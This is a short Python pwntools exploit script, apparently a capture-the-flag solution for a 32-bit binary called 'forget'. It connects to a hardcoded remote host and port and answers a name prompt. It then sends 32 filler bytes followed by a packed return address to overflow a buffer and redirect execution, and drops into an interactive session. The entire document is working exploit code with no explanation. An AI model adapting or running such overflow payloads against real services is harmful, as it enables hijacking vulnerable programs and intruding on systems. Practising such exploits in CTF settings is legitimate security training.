#coding = utf-8
from pwn import *

p = remote ('220.249.52.133',30307)
context(arch='i386',os='linux',log_level='debug')
elf = ELF('./forget')
#p=process('./forget')

addr=0x80486CC
#payload='\x47'*(0x20)+p32(addr)
payload='A'*(0x20)+p32(addr)

p.sendlineafter("What is your name?","yang")
p.sendlineafter("Enter the string to be validate",payload)
p.interactive()
